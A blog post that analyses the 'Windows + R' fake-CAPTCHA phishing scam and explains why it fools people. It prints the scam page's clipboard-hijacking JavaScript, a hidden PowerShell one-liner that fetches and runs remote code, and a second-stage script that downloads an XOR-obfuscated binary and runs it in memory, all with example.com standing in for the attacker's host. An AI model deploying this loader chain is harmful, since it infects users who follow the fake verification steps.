+++
title = "How does the Windows + R scam work"
date = 2024-10-29T06:57:18+08:00

[taxonomies]
tags = ["CAPTCHA", "PowerShell", "Security", "Windows"]
+++

You might have heard of the new scam about the [CAPTCHA] which asks you use Windows + R to verify that you are human.
It gives you a popup and introduces a verification step with `Windows + R` and `Ctrl + V` then press `Enter`.
You probably already know how it works, but let's take a closer look at their code this time.

<!-- more -->

Usually we see these scams from websites like [GitHub], [Reddit], etc.
They are usually disguised as normal comments, such as this below:

> Maybe this solution will solve your problem click this link: ...

They provide you with a link a and when you open it, you will find that the page requires a CAPTCHA verfication.
When you click this CPATCHA button, a window will pop up on the page and ask you to use a set of key combinations to complete the verification.
Like this:

> Verification Steps:\
> 1 - Press Windows + R\
> 2 - Press Ctrl + V\
> 3 - Press Enter

If you follow the steps they provide, you will fall into their trap.

### What happened during this process?

Let's look directly at their code to see what is executed during the process.

First, let's use [cURL] to obtain the source code of the target URL. I'm using an [example domain] here in case you enter the trap by accident.

```bash
curl https://example.com/captcha.html
```

Let's take a look at the key codes in the obtained content:

```js
function open_modal() {
  var copyText =
    "powershell -WindowStyle Hidden ([ScriptBlock]::Create((irm https://example.com/scam))).Invoke()";
  var textarea = document.createElement("textarea");
  textarea.value = copyText;
  document.body.appendChild(textarea);
  textarea.select();
  document.execCommand("copy");
  document.body.removeChild(textarea);
  setTimeout(() => {
    document.querySelector("#modal").classList.remove("hidden");
  }, 2000);
}
```

It creates a phishing modal and uses [execCommand("copy")] to secretly copy a command to your clipboard. Let's see what the command does:

```powershell
powershell -WindowStyle Hidden ([ScriptBlock]::Create((irm https://example.com/scam))).Invoke()
```

- `irm` is an alias of the [Invoke-RestMethod] command of [PowerShell]. This is used to send an HTTP or HTTPS request to a RESTful web service.
- [\[ScriptBlock\]::Create] creates a script block based on a script to be parsed when execution contenxt is provide.
- [-WindowStyle Hidden] sets the window style for the session to hidden.

Now let's move to the `https://example.com/scam` to see its content:

```bash
curl https://example.com/scam
```

```powershell
$url = "https://example.com/binary"
$webClient = New-Object System.Net.WebClient
$sell61 = $webClient.DownloadData($url)
$gossip123 = 0x09, 0x04, 0x05
$struggle6 = [byte[]]::new($sell61.Length)

for ($i = 0; $i -lt $sell61.Length; $i++) {
  $struggle6[$i] = $sell61[$i] -bxor $gossip123[$i % $gossip123.Length]
}

$afraid16 = [System.AppDomain]::CurrentDomain.Load($struggle6)

if ($afraid16.EntryPoint -ne $null) {
  $afraid16.EntryPoint.Invoke($null, @($null))
} else {
  Write-Host "glass glimpse glue gloom"
}
```

- [New-Object System.Net.WebClient] provides a common methods for sending data to and receiving data from a resource identified by a URI.
- `-bxor` is an [arithmetic operator] for bitwise XOR calculation. In this for-loop it should be a deobfuscation process.
- [\[Sytem.AppDomain\]::CurrentDomain.Load] loads an [Assembly] into the specific domain.

Then they cando whatever they want with your operating system through the implanted application.

### Why is the phishing method so effective?

Effective phishing methods are often easy to operate and can catch you without you realizing it.
Just like CAPTCHA, the various verification methods now make people lose their vigilancem, and some people lack basic computer knowledge and fall into this trap.

On the other hand, due to the rise of smartphones and tablets, some people have become computer illiterate, especially the kids.
As the [Discord post from r/Teachers] mentioned, more and more students don't know how to use computers.
People use their laptops only for schoolwork, and that's really about all you can do with it since the OS is so limited/sandboxed.

These factors combined make this phishing attack method such effective.

### Other similar attacks

Some merchants on the Internet will sell Steam games at extremely low prices.
They will give you a script and ask you to execute it.
This script will install pirated games on your computer and take the opportunity to implant malicious scripts.

### Links

- [Assembly]
- [CAPTCHA]
- [Discord post from r/Teachers]
- [GitHub]
- [Invoke-RestMethod]
- [New-Object System.Net.WebClient]
- [PowerShell]
- [Reddit]
- [arithmetic operator]
- [cURL]
- [example domain]
- [execCommand("Copy")]
- [-WindowStyle Hidden]
- [\[ScriptBlock\]::Create]
- [\[Sytem.AppDomain\]::CurrentDomain.Load]

[Assembly]: https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly
[CAPTCHA]: https://en.wikipedia.org/wiki/CAPTCHA
[Discord post from r/Teachers]: https://www.reddit.com/r/Teachers/comments/xuxbo9/why_dont_they_know_how_to_use_computers/
[GitHub]: https://github.com
[Invoke-RestMethod]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-restmethod
[New-Object System.Net.WebClient]: https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient
[PowerShell]: https://learn.microsoft.com/en-us/powershell/
[Reddit]: https://www.reddit.com
[arithmetic operator]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_arithmetic_operators
[cURL]: https://curl.se
[example domain]: https://www.iana.org/help/example-domains
[execCommand("Copy")]: https://developer.mozilla.org/en-US/docs/Web/API/Document/execCommand
[-WindowStyle Hidden]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pwsh#-windowstyle---w
[\[ScriptBlock\]::Create]: https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.scriptblock.create
[\[Sytem.AppDomain\]::CurrentDomain.Load]: https://learn.microsoft.com/en-us/dotnet/api/system.appdomain.load
